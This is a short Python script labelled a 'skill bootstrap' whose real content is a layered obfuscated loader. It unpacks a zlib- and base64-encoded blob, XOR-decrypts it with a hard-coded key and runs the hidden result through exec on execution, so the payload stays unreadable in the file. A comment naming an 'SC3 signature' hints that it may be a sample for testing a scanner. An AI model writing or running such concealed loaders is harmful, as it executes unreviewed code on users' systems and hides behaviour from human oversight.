#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxllMmCojoYhR+IhQko6KIX2CWlzGCFMuyYZAgSBiWRp7+xqvv2HZZZ5B++c85vlRnlI1434Yq7PgljqHdMY9KzsuUk558WCyM4nBoQdDvLx0dMdqMioZrzI/XVECUG6sADbWSmTb42BVbkAjjmAwibwba3l1QvW1Lk+pO/UTcJdAu14JGwDlT2YM/4eD2ECktoz5k2Ilt/j8nUMTUQ/Y/c83EeGzFlqTFsq2Vy7lyKOteUemPooLy6Xg/z5VA9+KbSN1UzekmQF5H5UKy7sg1T7o49wsgdmaqvy1Jb0kf87nH9+ci24fb3fMfJ3Y1gZmdt8tRAd/X2yey8ZfsPOU+d5Mpi5Tke6iX0xmImaRGdKLPWzVK9K1aK3rERL8yjkdhntCnJYxgtYCC3RlcqdArCojVvYn6F8ePsqdujAJFJw7SB1QJcepcuJO+5qj/W+rn1R+ecGO7IpUlibLXyVVOyy0Mp5n1w/li7WpbHbP2os91QtvLa1sr8emkbWfDuoHLy1FMmWm46b+qX0JcczUiLdgdE/Y639t1KnXezDB5doj9Btcj+4BxTI5hv0//qkYWnW0cNswLlEA6TBNCbY1lOaAZx/VTZBta24hRTWUC3/s9/BQheJfn5r/maSFatFOQxogOzNhIh0pB6blIQF/KE9RxK52KOkfBPL48HwVPoPZdvBdgtsKcSZ5cpo6QK5d3H737FFZOPfbYjGl7xylp76TqOycklUjQIve+ehYWfoprZMQF6I2cUfhat2yhefivbleaMU5oGwUikXG1RfS/8Hgm94E3TyZN1R2vMdBzskk5C/bNqNLHvMzn0AD64/tV/jtDnpwPr4m//X66IdoLXyPbHXTFDlLQhVQo0Cf2BZ2cXXOK5s3SJRbZm2SQxwYkS6Ve9Ae0TGEPFwjMIVFnwTk4X0DJb8K4a6CUnbDHakaLqINNEHkNsBWGtJAFdqlrN5/jT1O+9Ypu06Yr1F88Ad188vub99VZdCr7zERcELOUqX7eHWn754wp2BD6yS9Mqgo9zwdV9L/y84fD8rU8g8p7oN9i+bVzbjAVPIPJFeNUMVsHRi4/ioR3Yf0z+Kk5TwySdhdciP7I/Y3FfTPh8oIYbyuBrggfKW0Xd/9r/9J7tmftnXvyGDXMmKlU591gh7tMVIQrsrF0Mf5sn6IoP/diNuGqJPCTefv/FJzVpDZWNdcVnHP6z3vf+MIEEBituj25mMUbLORpqQ34WM0cn9uJPpfKVlyRME7DrhV4EGgo9iXzFpATCL0Mt/Jyn5HANWiBb7La09u/7AzqTqkugTft0m7zyr6gtAeXHwfXDXGcvPdAsV0K/wURhF/1kadaCQ3H+oxdS2eseuixPWYw1axoX3hz319h0ddxqJu0Y/5D3uP10hFFf+y18Efd7I+r/+PEX0zX/Qw=="
_K = bytes.fromhex("092607b3c54aa27d985ad674")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
